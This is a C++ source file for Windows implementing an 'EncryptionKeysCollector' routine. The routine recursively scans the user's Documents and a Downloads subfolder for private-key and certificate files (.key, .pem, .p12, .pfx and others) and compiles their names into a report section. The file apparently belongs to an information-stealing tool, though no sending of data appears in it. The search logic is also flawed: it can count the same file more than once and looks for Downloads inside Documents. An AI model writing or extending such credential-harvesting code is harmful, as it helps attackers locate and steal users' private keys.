#include "encryption_keys_collector.h"
#include <Windows.h>
#include <shlobj.h>
#include <iostream>
#include <sstream>
#include <filesystem>
#include <vector>

std::string EncryptionKeysCollector::CollectEncryptionKeys() {
    std::ostringstream result;
    result << "\n=== ENCRYPTION KEYS ===\n";
    
    char documentsPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, SHGFP_TYPE_CURRENT, documentsPath);
    
    std::vector<std::string> keyPatterns = {".key", ".pem", ".p12", ".pfx", ".crt", ".cer"};
    std::vector<std::string> searchPaths = {documentsPath, std::string(documentsPath) + "\\Downloads"};
    
    int foundCount = 0;
    for (const auto& searchPath : searchPaths) {
        if (!std::filesystem::exists(searchPath)) continue;
        
        for (const auto& pattern : keyPatterns) {
            try {
                for (auto& p : std::filesystem::recursive_directory_iterator(searchPath)) {
                    if (p.is_regular_file() && foundCount < 15) {
                        std::string ext = p.path().extension().string();
                        if (ext == pattern || ext.find("key") != std::string::npos) {
                            result << "Key file: " << p.path().filename().string() << "\n";
                            foundCount++;
                        }
                    }
                }
            } catch (...) {
                // Skip
            }
            if (foundCount >= 15) break;
        }
        if (foundCount >= 15) break;
    }
    
    result << "Total key files found: " << foundCount << "\n";
    
    return result.str();
}
